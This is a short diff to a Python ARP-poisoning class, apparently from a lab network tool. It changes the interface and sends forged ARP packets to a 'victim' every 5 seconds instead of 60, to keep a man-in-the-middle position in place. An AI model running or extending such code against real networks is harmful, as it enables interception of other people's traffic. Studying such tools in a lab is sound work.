@@ -27,9 +27,9 @@ class ArpPoisoning:
     # refresh arp tables in case victim updates itself
     def maintain_arp_poison(self, arp1, arp2):
         while True:
-            sendp(arp1, iface="enp0s3")
-            sendp(arp2, iface="enp0s3")
-            time.sleep(60)
+            sendp(arp1, iface="enp0s8")
+            sendp(arp2, iface="enp0s8")
+            time.sleep(5)
 
     # execute the arp poisoning
     def execute_poisoning(self):
